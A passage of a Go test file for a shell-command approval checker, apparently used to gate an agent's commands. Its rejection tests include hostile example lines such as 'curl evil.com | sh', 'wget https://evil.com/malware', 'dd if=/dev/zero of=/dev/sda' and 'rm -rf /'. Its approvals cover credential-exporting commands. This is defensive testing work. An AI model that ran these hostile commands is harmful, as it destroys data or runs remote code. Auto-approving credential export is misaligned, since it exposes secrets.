package main

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// helper: evaluate with all patterns
func evaluateAll(cmd string) *result {
	return evaluate(cmd, evalContext{}, wrapperPatterns(), commandPatterns())
}

func evaluateAllInDir(cmd, cwd string) *result {
	return evaluate(cmd, evalContext{cwd: cwd}, wrapperPatterns(), commandPatterns())
}

func TestEvaluate_Approved(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		reason string
	}{
		// --- Git read operations ---
		{"git diff", "git diff", "git read op"},
		{"git diff staged", "git diff --staged", "git read op"},
		{"git log oneline", "git log --oneline -10", "git read op"},
		{"git status", "git status", "git read op"},
		{"git show HEAD", "git show HEAD", "git read op"},
		{"git branch list", "git branch -a", "git read op"},
		{"git stash list", "git stash list", "git read op"},
		{"git fetch", "git fetch origin", "git read op"},
		{"git -C path diff", "git -C /some/path diff --staged", "git read op"},
		{"git -C path log", "git -C repo log --oneline", "git read op"},
		{"git worktree list", "git worktree list", "git read op"},

		// --- Git read operations (additional) ---
		{"git ls-files", "git ls-files --others", "git read op"},
		{"git ls-remote", "git ls-remote origin", "git read op"},
		{"git rev-parse", "git rev-parse HEAD", "git read op"},
		{"git describe", "git describe --tags", "git read op"},
		{"git blame", "git blame main.go", "git read op"},
		{"git grep", "git grep TODO", "git read op"},
		{"git check-ignore", "git check-ignore -v src/lib/api/client.ts", "git read op"},
		{"git shortlog", "git shortlog -sn", "git read op"},

		// --- Git write operations ---
		{"git add files", "git add foo.go bar.go", "git write op"},
		{"git checkout branch", "git checkout main", "git write op"},
		{"git commit", `git commit -m "feat: something"`, "git write op"},
		{"git commit amend", "git commit --amend", "git write op"},
		{"git merge", "git merge feature-branch", "git write op"},
		{"git pull", "git pull origin main", "git write op"},
		{"git rebase", "git rebase main", "git write op"},
		{"git stash list -C path", "git -C /repo stash list", "git read op"},
		{"git cherry-pick", "git cherry-pick abc123", "git write op"},
		{"git cherry-pick skip", "git -C /repo cherry-pick --skip", "git write op"},
		{"git worktree add", "git worktree add /tmp/wt feature", "git write op"},
		{"git switch", "git switch feature-branch", "git write op"},
		{"git remote", "git remote add origin url", "git write op"},
		{"git config", "git config user.name", "git write op"},
		{"git rerere", "git rerere", "git write op"},
		{"git -C path add", "git -C /repo add .", "git write op"},

		// --- Git commit with heredoc (now approved via recursive CmdSubst eval) ---
		{"git commit heredoc", "git commit -m \"$(cat <<'EOF'\ncommit msg\nEOF\n)\"", "git write op"},

		// --- Jujutsu (jj) ---
		{"jj log", "jj log -r @", "jj read op"},
		{"jj diff", "jj diff -r @", "jj read op"},
		{"jj show", "jj show @", "jj read op"},
		{"jj status", "jj status", "jj read op"},
		{"jj file list", "jj file list", "jj read op"},
		{"jj bookmark list", "jj bookmark list", "jj read op"},
		{"jj op log", "jj op log", "jj read op"},
		{"jj new", "jj new main", "jj write op"},
		{"jj commit", "jj commit -m 'my change'", "jj write op"},
		{"jj describe", "jj describe -m 'update description'", "jj write op"},
		{"jj squash", "jj squash", "jj write op"},
		{"jj bookmark create", "jj bookmark create my-feature -r @", "jj write op"},
		{"jj bookmark set", "jj bookmark set my-feature -r @", "jj write op"},
		{"jj bookmark delete", "jj bookmark delete old-branch", "jj write op"},
		{"jj bookmark move", "jj bookmark move my-feature --to @", "jj write op"},
		{"jj git fetch", "jj git fetch", "jj write op"},
		{"jj rebase", "jj rebase -d main", "jj write op"},
		{"jj edit", "jj edit @-", "jj write op"},
		{"jj abandon", "jj abandon @", "jj write op"},

		// --- Beads (bd) ---
		{"bd", "bd run task", "bd"},
		{"bd list", "bd list", "bd"},

		// --- Python ecosystem ---
		{"pytest", "pytest -x tests/", "pytest"},
		{"pytest verbose", "pytest -v --tb=short", "pytest"},
		{"python script", "python script.py", "python"},
		{"python module", "python -m http.server", "python"},
		{"python3 script", "python3 script.py", "python"},
		{"python3 module", "python3 -m pytest", "python"},
		{"ruff check", "ruff check .", "ruff"},
		{"ruff format", "ruff format --check src/", "ruff"},

		// --- uv ---
		{"uv pip install", "uv pip install requests", "uv"},
		{"uv run", "uv run pytest", "uv"},
		{"uv sync", "uv sync", "uv"},
		{"uv venv", "uv venv .venv", "uv"},
		{"uv add", "uv add requests", "uv"},
		{"uv tool run", "uv tool run dbc install --help", "uv"},
		{"uv tool install", "uv tool install dbc", "uv"},
		{"uv lock", "uv lock", "uv"},
		{"uvx", "uvx black .", "uvx"},

		// --- Node ecosystem ---
		{"npm install", "npm install", "npm"},
		{"npm run build", "npm run build", "npm"},
		{"npm test", "npm test", "npm"},
		{"npm ci", "npm ci", "npm"},
		{"npx prettier", "npx prettier --write .", "npx"},
		{"node -e", `node -e "console.log('hello')"`, "node -e"},
		{"node -p", `node -p "1+1"`, "node -e"},
		{"bun install", "bun install", "bun"},
		{"bun run", "bun run dev", "bun"},
		{"bun test", "bun test", "bun"},
		{"bunx", "bunx prettier --write .", "bunx"},

		// --- Rust ecosystem ---
		{"cargo build", "cargo build --release", "cargo"},
		{"cargo test", "cargo test -- --nocapture", "cargo"},
		{"cargo check", "cargo check", "cargo"},
		{"cargo clippy", "cargo clippy -- -D warnings", "cargo"},
		{"cargo fmt", "cargo fmt", "cargo"},
		{"cargo run", "cargo run --bin myapp", "cargo"},
		{"cargo clean", "cargo clean", "cargo"},
		{"maturin develop", "maturin develop", "maturin"},
		{"maturin build", "maturin build --release", "maturin"},

		// --- Make ---
		{"make", "make", "make"},
		{"make target", "make build", "make"},
		{"make with var", "make VERBOSE=1 test", "make"},
		{"mise run", "mise run lint-rfp", "mise"},
		{"mise run piped", "mise run lint-rfp 2>&1 | tail -5", "mise | read-only"},
		{"mise exec", "mise exec -- python script.py", "mise"},
		{"mise --version", "mise --version", "mise"},
		{"mise which", "mise which docker-compose", "mise"},
		{"mise search", "mise search docker", "mise"},
		{"mise activate", "mise activate", "mise"},
		{"mise list", "mise list", "mise"},
		{"mise doctor", "mise doctor", "mise"},
		{"mise approve", "mise approve", "mise"},
		{"mise lock", "mise lock", "mise"},
		{"mise lock dry-run", "mise lock --dry-run", "mise"},

		// --- Read-only commands ---
		{"ls", "ls -la", "read-only"},
		{"cat file", "cat foo.txt", "read-only"},
		{"head", "head -20 file.go", "read-only"},
		{"tail", "tail -f log.txt", "read-only"},
		{"wc", "wc -l *.go", "read-only"},
		{"find", "find . -name '*.go'", "find"},
		{"grep", "grep -r TODO src/", "read-only"},
		{"rg", "rg 'func main' .", "read-only"},
		{"file", "file binary", "read-only"},
		{"which", "which python", "read-only"},
		{"pwd", "pwd", "read-only"},
		{"curl", "curl -s https://example.com", "curl"},
		{"sort", "sort output.txt", "read-only"},
		{"uniq", "uniq -c counts.txt", "read-only"},
		{"cut", "cut -d: -f1 /etc/passwd", "read-only"},
		{"tr", "tr '[:upper:]' '[:lower:]'", "read-only"},
		{"awk", "awk '{print $1}' file", "read-only"},
		{"sed", "sed 's/foo/bar/g' file", "read-only"},
		{"xargs echo", "xargs echo", "xargs"},
		{"xxd", "xxd file.bin", "read-only"},
		{"od", "od -A x -t x1z file.bin", "read-only"},
		{"hexdump", "hexdump -C file.bin", "read-only"},
		{"sqlite3", `sqlite3 foo.db "SELECT * FROM decisions"`, "read-only"},
		{"tee", "tee /tmp/output.log", "read-only"},
		{"diff", "diff file1.txt file2.txt", "read-only"},
		{"stat", "stat -f '%Sm' file.txt", "read-only"},
		{"realpath", "realpath ../foo", "read-only"},
		{"basename", "basename /path/to/file.txt", "read-only"},
		{"dirname", "dirname /path/to/file.txt", "read-only"},
		{"readlink", "readlink -f symlink", "read-only"},
		{"md5sum", "md5sum file.bin", "read-only"},
		{"sha256sum", "sha256sum file.bin", "read-only"},
		{"shasum", "shasum -a 256 file.bin", "read-only"},
		{"lsof", "lsof -i :5173", "read-only"},
		{"ps", "ps aux", "read-only"},
		{"pgrep", "pgrep -f myprocess", "read-only"},
		{"jq", "jq '.data[]' file.json", "read-only"},
		{"yq", "yq '.metadata.name' file.yaml", "read-only"},
		{"id", "id", "read-only"},
		{"whoami", "whoami", "read-only"},
		{"hostname", "hostname", "read-only"},
		{"uname", "uname -a", "read-only"},
		{"date", "date +%Y-%m-%d", "read-only"},
		{"env bare", "env", "read-only"},
		{"du", "du -sh .", "read-only"},
		{"df", "df -h", "read-only"},

		// --- Misc safe commands ---
		{"touch", "touch newfile.txt", "touch"},
		{"true", "true", "shell builtin"},
		{"false", "false", "shell builtin"},
		{"exit 0", "exit 0", "shell builtin"},
		{"wait", "wait", "shell builtin"},
		{"seq", "seq 1 10", "read-only"},
		{"kill pid", "kill 12345", "process mgmt"},
		{"pkill", "pkill -f myprocess", "process mgmt"},
		{"export", "export NEWPORT_VERSION", "shell vars"},
		{"export with value", "export FOO=bar", "shell vars"},
		{"unset", "unset MY_VAR", "shell vars"},
		{"declare", "declare -x MY_VAR=hello", "shell vars"},
		{"eval", "eval $(aws configure export-credentials --format env)", "eval"},
		{"echo", "echo hello world", "echo"},
		{"printf", `printf "y\n\n"`, "echo"},
		{"cd dir", "cd /tmp", "cd"},
		{"source venv", "source .venv/bin/activate", "source"},
		{". venv", ". .venv/bin/activate", "source"},
		{"source env file", "source /tmp/.bash_env-almaty", "source"},
		{"sleep", "sleep 5", "sleep"},
		{"mkdir", "mkdir -p /tmp/build", "mkdir"},
		{"cp -n", "cp -n file1 file2", "cp -n"},
		{"cp -rn", "cp -rn src/ dest/", "cp -n"},
		{"cp -nr", "cp -nr src/ dest/", "cp -n"},
		{"ln -s", "ln -s target link", "ln -s"},
		{"ln -sn", "ln -sn target link", "ln -s"},
		{"var assignment", "FOO=bar", "var assignment"},

		// --- kubectl ---
		{"kubectl get pods", "kubectl get pods -n default", "kubectl read op"},
		{"kubectl get with context before", "kubectl --context gke_foo_bar get pods", "kubectl read op"},
		{"kubectl get with context after", "kubectl get pods --context gke_foo_bar -n default", "kubectl read op"},
		{"kubectl logs with flags mixed", "kubectl logs deployment/api --context gke_foo --tail=20 --timestamps", "kubectl read op"},
		{"kubectl describe", "kubectl describe pod/foo", "kubectl read op"},
		{"kubectl logs", "kubectl logs deployment/api --tail=20", "kubectl read op"},
		{"kubectl top", "kubectl top pods", "kubectl read op"},
		{"kubectl rollout status", "kubectl rollout status deployment/foo", "kubectl read op"},
		{"kubectl rollout restart", "kubectl rollout restart deployment/foo", "kubectl write op"},
		{"kubectl apply", "kubectl apply -f manifest.yaml", "kubectl write op"},
		{"kubectl delete", "kubectl delete pod/foo", "kubectl write op"},
		{"kubectl scale", "kubectl scale deployment/foo --replicas=3", "kubectl write op"},
		{"kubectl port-forward", "kubectl port-forward pod/foo 8080:80", "kubectl port-forward"},
		{"kubectl port-forward with context", "kubectl --context gke_foo_bar port-forward pod/foo 8080:80", "kubectl port-forward"},
		{"kubectl exec", "kubectl exec -it pod/foo -- bash", "kubectl exec"},
		{"kubectl cp", "kubectl cp pod/foo:/tmp/file ./local", "kubectl cp"},

		// --- Linters / static analysis ---
		{"shellcheck", "shellcheck scripts/foo.sh", "shellcheck"},
		{"shellcheck version", "shellcheck --version", "shellcheck"},

		// --- vitest (via node_modules/.bin wrapper) ---
		{"vitest run", "node_modules/.bin/vitest run src/test.ts", "node_modules/.bin+vitest"},
		{"vitest bare", "vitest run", "vitest"},

		// --- grpc ---
		{"grpcurl", "grpcurl -plaintext localhost:50051 list", "grpcurl"},

		// --- GitHub CLI ---
		{"gh pr view", "gh pr view 123", "gh read op"},
		{"gh pr list", "gh pr list --state open", "gh read op"},
		{"gh pr diff", "gh pr diff 123", "gh read op"},
		{"gh pr checks", "gh pr checks 123", "gh read op"},
		{"gh pr status", "gh pr status", "gh read op"},
		{"gh issue view", "gh issue view 456", "gh read op"},
		{"gh issue list", "gh issue list", "gh read op"},
		{"gh run view", "gh run view 789", "gh read op"},
		{"gh release list", "gh release list", "gh read op"},
		{"gh pr create", "gh pr create --title 'fix' --body 'desc'", "gh pr create"},
		{"gh pr merge", "gh pr merge 123", "gh write op"},
		{"gh pr close", "gh pr close 123", "gh write op"},
		{"gh pr review", "gh pr review 123 --approve", "gh write op"},
		{"gh search code", "gh search code 'pattern' --repo owner/repo", "gh search"},
		{"gh search repos", "gh search repos 'query'", "gh search"},
		{"gh search issues", "gh search issues 'bug'", "gh search"},
		{"gh repo clone", "gh repo clone owner/repo", "gh repo clone"},
		{"gh api", "gh api repos/foo/bar/pulls", "gh api"},

		// --- Go toolchain ---
		{"golangci-lint", "golangci-lint run ./...", "golangci-lint"},
		{"go build", "go build ./...", "go"},
		{"go test", "go test -v ./...", "go"},
		{"go vet", "go vet ./...", "go"},
		{"go list", "go list -m all", "go"},
		{"go get", "go get golang.org/x/tools", "go"},
		{"go mod tidy", "go mod tidy", "go"},
		{"go mod download", "go mod download", "go"},
		{"go run", "go run main.go", "go"},
		{"go fmt", "go fmt ./...", "go"},
		{"go generate", "go generate ./...", "go"},
		{"go install", "go install golang.org/x/tools/...", "go"},
		{"go clean", "go clean -cache", "go"},
		{"go doc", "go doc github.com/charmbracelet/lipgloss Style", "go"},
		{"go env", "go env GOPATH", "go"},
		{"go version", "go version", "go"},
		{"go tool", "go tool pprof cpu.prof", "go"},
		{"ginkgo", "ginkgo -r ./...", "ginkgo"},
		{"ginkgo parallel", "ginkgo -r --procs 4 ./...", "ginkgo"},
		{"ginkgo focus", "ginkgo -r -focus 'describe filter' ./...", "ginkgo"},

		// --- AWS ---
		{"aws configure", "aws configure export-credentials --format env --profile thinknear", "aws"},
		{"aws sts", "aws sts get-caller-identity", "aws"},
		{"aws s3 ls", "aws s3 ls s3://mybucket", "aws"},
		{"aws ecr", "aws ecr get-login-password --region us-east-1", "aws"},

		// --- Google Cloud CLI ---
		{"gcloud logging read", `gcloud logging read 'severity="ERROR"' --project=my-proj --format=json --limit=50`, "gcloud logging"},
		{"gcloud logging read multiline", "gcloud logging read 'resource.type=\"k8s_container\" AND severity=\"ERROR\"' \\\n  --project=media-prod-420022 \\\n  --format='csv[no-heading](timestamp)' \\\n  --limit=500", "gcloud logging"},
		{"gcloud compute instances list", "gcloud compute instances list --project=my-proj --filter='status=RUNNING' --format='table(zone)'", "gcloud compute read"},
		{"gcloud compute backend-services describe", "gcloud compute backend-services describe my-svc --project=my-proj --region=us-central1 --format=yaml", "gcloud compute read"},
		{"gcloud container clusters list", "gcloud container clusters list --project=my-proj", "gcloud container read"},
		{"gcloud container clusters describe", "gcloud container clusters describe my-cluster --zone=us-east4-a", "gcloud container read"},
		{"gcloud auth print-access-token", "gcloud auth print-access-token", "gcloud auth"},
		{"gcloud config list", "gcloud config list", "gcloud config"},
		{"gcloud config get-value", "gcloud config get-value project", "gcloud config"},
		{"gcloud projects list", "gcloud projects list", "gcloud projects"},
		{"gcloud projects describe", "gcloud projects describe my-proj", "gcloud projects"},

		// --- BigQuery ---
		{"bq ls", "bq ls mydataset", "bq"},
		{"bq show", "bq show mydataset.mytable", "bq"},
		{"bq query", `bq query --use_legacy_sql=false "SELECT 1"`, "bq"},
		{"bq head", "bq head mydataset.mytable", "bq"},
		{"bq version", "bq version", "bq"},
		{"bq help", "bq help", "bq"},

		// --- Atlassian CLI ---
		{"acli jira", "acli jira listIssues", "acli"},
		{"acli confluence", "acli confluence getPage --space DEV", "acli"},

		// --- Roborev ---
		{"roborev show", "roborev show HEAD", "roborev show"},
		{"roborev show job", "roborev show --job 123", "roborev show"},
		{"roborev list", "roborev list", "roborev read op"},
		{"roborev list branch", "roborev list --branch main", "roborev read op"},
		{"roborev summary", "roborev summary", "roborev read op"},
		{"roborev wait", "roborev wait 123", "roborev read op"},
		{"roborev stream", "roborev stream", "roborev read op"},
		{"roborev status", "roborev status", "roborev"},

		// --- Ruby ecosystem ---
		{"rspec", "rspec spec/models/user_spec.rb", "rspec"},
		{"rspec verbose", "rspec --format documentation", "rspec"},
		{"rake", "rake db:migrate", "rake"},
		{"rake test", "rake test", "rake"},
		{"ruby script", "ruby script.rb", "ruby"},
		{"ruby -e", "ruby -e 'puts 1'", "ruby"},
		{"rails test", "rails test test/models/user_test.rb", "rails"},
		{"rails console", "rails console", "rails"},
		{"rails runner", "rails runner 'puts User.count'", "rails"},
		{"rails db:migrate", "rails db:migrate", "rails"},
		{"rails routes", "rails routes", "rails"},
		{"bundle install", "bundle install", "bundle"},
		{"bundle update", "bundle update rails", "bundle"},
		{"bundle check", "bundle check", "bundle"},
		{"bundle list", "bundle list", "bundle"},
		{"bundle exec standalone", "bundle exec rspec", "bundle exec+rspec"},
		{"bundle exec rake", "bundle exec rake test", "bundle exec+rake"},
		{"bundle exec rubocop", "bundle exec rubocop --auto-correct", "bundle exec+rubocop"},
		{"gem list", "gem list", "gem"},
		{"rubocop", "rubocop --auto-correct", "rubocop"},
		{"rubocop check", "rubocop --format json", "rubocop"},
		{"solargraph", "solargraph typecheck", "solargraph"},
		{"standardrb", "standardrb --fix", "standardrb"},

		// --- brew ---
		{"brew install", "brew install vhs", "brew"},
		{"brew list", "brew list", "brew"},
		{"brew search", "brew search charmbracelet", "brew"},
		{"brew info", "brew info vhs", "brew"},
		{"brew tap", "brew install charmbracelet/tap/vhs", "brew"},
		{"brew doctor", "brew doctor", "brew"},

		// --- Pre-commit (prek) ---
		{"prek list", "prek list", "prek"},
		{"prek install", "prek install", "prek"},
		{"pre-commit run", "pre-commit run --all-files", "prek"},

		// --- process-compose ---
		{"process-compose process list", "process-compose process list --port 12003", "process-compose"},
		{"process-compose project state", "process-compose project state --port 12003", "process-compose"},
		{"process-compose process logs", "process-compose process logs backend --port 12003", "process-compose"},
		{"process-compose process restart", "process-compose process restart backend --port 12003", "process-compose"},
		{"process-compose logs", "process-compose logs --process teley", "process-compose"},
		{"process-compose help", "process-compose --help", "process-compose"},

		// --- ffmpeg ---
		{"ffmpeg convert", "ffmpeg -i input.mp4 -c:v libx264 output.mp4", "ffmpeg"},
		{"ffprobe info", "ffprobe -v quiet -print_format json -show_streams video.mp4", "ffprobe"},

		// --- Docker ---
		{"docker exec", "docker exec mycontainer bash -c 'echo hello'", "docker"},
		{"docker ps", "docker ps -a", "docker"},
		{"docker info", "docker info", "docker"},
		{"docker context ls", "docker context ls", "docker"},
		{"docker --help", "docker --help", "docker"},
		{"docker version", "docker version", "docker"},
		{"docker logs", "docker logs -f mycontainer", "docker"},
		{"docker build", "docker build -t myimage .", "docker"},
		{"docker compose up", "docker compose up -d", "docker compose"},
		{"docker compose down", "docker compose down", "docker compose"},
		{"docker compose run", "docker compose run --rm mytest", "docker compose"},
		{"docker compose build", "docker compose build myservice", "docker compose"},
		{"docker compose ps", "docker compose ps", "docker compose"},
		{"docker compose logs", "docker compose logs -f myservice", "docker compose"},
		{"docker compose config", "docker compose config --format json", "docker compose"},
		{"docker compose ls", "docker compose ls --all --format json", "docker compose"},
		{"docker compose version", "docker compose version", "docker compose"},
		{"absolute path docker", "/Users/me/.rd/bin/docker exec mycontainer ls", "absolute path+docker"},
		{"absolute path docker compose up", "/Users/me/.rd/bin/docker compose -f docker-compose.yml up", "absolute path+docker compose"},
		{"docker-compose", "docker-compose up", "docker-compose"},

		// --- Backgrounded commands ---
		{"backgrounded git", "git status &", "git read op"},
		{"background docker with echo", "docker compose run --rm mytest & \necho \"PID: $!\"", "docker compose | echo"},
		{"negated command", "! git diff --quiet", "git read op"},

		// --- For loops ---
		{"for loop simple", "for f in *.go; do echo $f; done", "for{echo}"},
		{"for loop multi cmd", "for id in 1 2 3; do echo \"=== $id ===\"; git status; done", "for{echo | git read op}"},
		{"for loop with pipe", "for id in 260 261; do\n  echo \"=== JOB $id ===\"\n  roborev show --job $id --json 2>&1 | python3 -c \"import json,sys; print('ok')\"\n  echo \"\"\ndone", "for{echo | roborev show | python | echo}"},
		{"for loop with seq and wait", "for i in $(seq 1 5); do\n  go test ./... &\ndone\nwait", "for{go} | shell builtin"},
		{"for loop with grpcurl", "for io in 219129 220338; do\n  echo \"=== IO $io ===\"\n  grpcurl -plaintext localhost:50051 list\ndone", "for{echo | grpcurl}"},

		{"for loop safe iteration subst", "for f in $(find . -name '*.go'); do echo $f; done", "for{echo}"},

		// --- While loops ---
		{"while loop", "while true; do sleep 1; done", "while{sleep}"},
		{"while loop safe condition", "while git diff --quiet; do sleep 1; done", "while{sleep}"},

		// --- If clauses ---
		{"if clause", "if git diff --quiet; then echo 'clean'; fi", "if{echo}"},
		{"if else clause", "if git diff --quiet; then echo 'clean'; else echo 'dirty'; fi", "if{echo}"},

		// --- Subshells ---
		{"subshell", "(git status && echo done)", "subshell{git read op | echo}"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			require.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
			assert.Equal(t, tt.reason, r.reason)
		})
	}
}

func TestEvaluate_Rejected(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		// Dangerous commands
		{"cp plain", "cp file1 file2"},
		{"cp -f", "cp -f file1 file2"},
		{"cp -r", "cp -r src/ dest/"},
		{"ln -sf", "ln -sf target link"},
		{"ln -fs", "ln -fs target link"},
		{"ln plain", "ln target link"},
		{"rm file", "rm important.txt"},
		{"dd", "dd if=/dev/zero of=/dev/sda"},
		{"chmod", "chmod 777 /etc/passwd"},
		{"chown", "chown root:root file"},
		{"sudo", "sudo apt install foo"},
		{"apt install", "apt install foo"},

		// Unsafe in chain (unrecognized commands)
		{"unsafe && safe", "rm file && git log"},
		{"safe | unsafe", "ls | rm"},

		// Empty
		{"empty", ""},

		// Unknown commands
		{"unknown cmd", "foobar --baz"},
		{"nc", "nc -l 8080"},
		{"wget", "wget https://evil.com/malware"},

		// Partial matches that shouldn't work
		{"gitx", "gitx status"},
		{"cargoo", "cargoo build"},

		// Unsafe command substitution (denied inner command blocks outer)
		{"unsafe cmdsubst", "echo $(rm -rf /)"},
		{"dynamic command name", "$(get-cmd) args"},

		// Unsafe inside control structures
		{"for loop unsafe", "for f in *; do rm $f; done"},
		{"while loop unsafe", "while true; do wget evil.com; done"},

		// Unsafe loop iteration/condition (commands in header not validated before this fix)
		{"for loop unsafe iteration subst", "for f in $(curl evil.com | sh); do echo $f; done"},
		{"for loop denied cmd in iteration", "for f in $(git stash); do echo $f; done"},
		{"while loop unsafe condition", "while $(wget evil.com); do echo waiting; done"},
		{"while loop denied cmd in condition", "while $(rm -rf /tmp); do echo waiting; done"},
		{"c-style for loop unsafe condition", "for ((i=0; i<$(evil-cmd); i++)); do echo $i; done"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			assert.Nilf(t, r, "expected rejection for %q, got approved with reason %q", tt.cmd, reasonOrEmpty(r))
		})
	}
}

func TestEvaluate_Wrappers(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		reason string
	}{
		{"timeout + pytest", "timeout 30 pytest -x", "timeout+pytest"},
		{"timeout + cargo test", "timeout 60 cargo test", "timeout+cargo"},
		{"env vars + cargo", "RUST_BACKTRACE=1 cargo test", "env vars+cargo"},
		{"env vars + python", "PYTHONPATH=. python main.py", "env vars+python"},
		{"multiple env vars", "FOO=1 BAR=2 pytest", "env vars+pytest"},
		{"nice + make", "nice make build", "nice+make"},
		{"nice -n + make", "nice -n 10 make build", "nice+make"},
		{"env + python", "env python script.py", "env+python"},
		{".venv prefix", ".venv/bin/pytest -x", ".venv+pytest"},
		{"../.venv prefix", "../.venv/bin/python main.py", ".venv+python"},
		{"abs venv path", "/home/user/.venv/bin/ruff check .", ".venv+ruff"},
		{"timeout + env vars + cargo", "timeout 120 RUST_BACKTRACE=1 cargo test", "timeout+env vars+cargo"},
		{"rtk proxy + go test", "rtk proxy go test ./...", "rtk proxy+go"},
		{"rtk proxy + git status", "rtk proxy git status", "rtk proxy+git read op"},
		{"command + go test", "command go test ./...", "command+go"},
		{"command + go build", "command go build ./...", "command+go"},
		{"command + go vet", "command go vet ./...", "command+go"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			require.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
			assert.Equal(t, tt.reason, r.reason)
		})
	}
}

func TestEvaluate_Chains(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		reason string
	}{
		{"and chain", "git diff --staged && ruff check .", "git read op | ruff"},
		{"or chain", "git status || echo fallback", "git read op | echo"},
		{"semicolon", "ls; pwd", "read-only | read-only"},
		{"pipe", "git log --oneline | head -5", "git read op | read-only"},
		{"triple chain", "git add . && git diff --staged && pytest", "git write op | git read op | pytest"},
		{"roborev show piped to jq", `roborev show --job 123 --json 2>&1 | jq '{job_id: .job_id}'`, "roborev show | read-only"},
		{"git add && commit", `git add internal/agent/agent.go internal/agent/agent_test_helpers.go cmd/roborev/main.go && git commit -m "feat: register kilo in agent fallback list and help text"`, "git write op | git write op"},
		{"gcloud logging piped", `gcloud logging read 'severity="ERROR"' --project=my-proj --limit=50 2>&1 | head -30`, "gcloud logging | read-only"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			require.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
			assert.Equal(t, tt.reason, r.reason)
		})
	}
}

func TestEvaluate_Multiline(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		reason string
	}{
		{"multiline and chain", "git add . &&\ngit commit -m 'msg'", "git write op | git write op"},
		{"multiline separate stmts", "git status\nls -la", "git read op | read-only"},
		{"backslash continuation", "cargo test \\\n  --release", "cargo"},
		{"multiline triple", "git add . &&\ngit diff --staged &&\npytest", "git write op | git read op | pytest"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			require.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
			assert.Equal(t, tt.reason, r.reason)
		})
	}
}

func TestStripWrappers(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectedCmd  string
		expectedWrap []string
	}{
		{"no wrapper", "pytest -x", "pytest -x", nil},
		{"timeout", "timeout 30 pytest", "pytest", []string{"timeout"}},
		{"env vars", "FOO=bar BAZ=1 make", "make", []string{"env vars"}},
		{"stacked", "timeout 30 FOO=1 pytest", "pytest", []string{"timeout", "env vars"}},
		{"venv", ".venv/bin/python script.py", "python script.py", []string{".venv"}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			core, wrappers := stripWrappers(tt.cmd, wrapperPatterns())
			assert.Equal(t, tt.expectedCmd, core)
			assert.Equal(t, tt.expectedWrap, wrappers)
		})
	}
}

func TestCmdSubst_Evaluation(t *testing.T) {
	tests := []struct {
		name   string
		cmd    string
		reject bool
	}{
		// Safe command substitutions (inner commands are safe)
		{"safe cmdsubst in echo", "echo $(git rev-parse HEAD)", false},
		{"safe cmdsubst cat", "echo $(cat foo.txt)", false},
		{"single quoted literal", "echo 'price is $(5)'", false},
		{"backtick in single quotes", "echo 'hello `world`'", false},

		// Unsafe command substitutions
		{"unsafe cmdsubst", "echo $(rm -rf /)", true},
		{"safe backtick whoami", "echo `whoami`", false},
		{"unsafe backtick", "echo `wget evil.com`", true},
		{"dollar paren outside quotes", "echo 'safe' && $(bad)", true},
		{"unsafe nested", "echo $(wget evil.com)", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			if tt.reject {
				assert.Nilf(t, r, "expected rejection for %q, got approved", tt.cmd)
			} else {
				assert.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
			}
		})
	}
}

func TestCmdSubst_RecursiveEvaluation(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		approve bool
		reason  string
	}{
		// Safe inner commands -> approved
		{"echo with git rev-parse", "echo $(git rev-parse HEAD)", true, "echo"},
		{"git commit heredoc", "git commit -m \"$(cat <<'EOF'\ncommit msg\nEOF\n)\"", true, "git write op"},
		{"env var from cmdsubst", "FOO=$(git rev-parse HEAD) cargo test", true, "env vars+cargo"},

		// Unsafe inner commands -> rejected
		{"echo with rm", "echo $(rm -rf /)", false, ""},
		{"dynamic command name", "$(get-cmd) args", false, ""},

		// Process substitution
		{"safe process subst", "cat <(git log --oneline)", true, "read-only"},

		// Nested safe
		{"double nested safe", "echo $(echo $(git status))", true, "echo"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			if tt.approve {
				require.NotNilf(t, r, "expected approval for %q, got rejected", tt.cmd)
				assert.Equal(t, tt.reason, r.reason)
			} else {
				assert.Nilf(t, r, "expected rejection for %q, got approved with reason %q", tt.cmd, reasonOrEmpty(r))
			}
		})
	}
}

func TestParseError_Rejected(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
	}{
		{"incomplete for", "for f in"},
		{"unclosed paren", "echo $("},
		{"unclosed quote", `echo "hello`},
		{"incomplete while", "while true"},
		{"lone done", "done"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := evaluateAll(tt.cmd)
			assert.Nilf(t, r, "expected rejection for malformed bash %q, got approved", tt.cmd)
		})
	}
}

// --- Config and category tests ---

func TestIsEnabled(t *testing.T) {
	tests := []struct {
		name       string
		tags       []string
		cfg        Config
		wantResult bool
	}{
		// "all" enables everything
		{"all enabled", []string{"git read op", "git"}, Config{Enabled: []string{"all"}}, true},
		{"all enabled unknown", []string{"foo", "bar"}, Config{Enabled: []string{"all"}}, true},

		// "all" disabled blocks everything
		{"all disabled", []string{"git read op", "git"}, Config{Disabled: []string{"all"}}, false},

		// coarse group (second tag)
		{"group enabled", []string{"git read op", "git"}, Config{Enabled: []string{"git"}}, true},
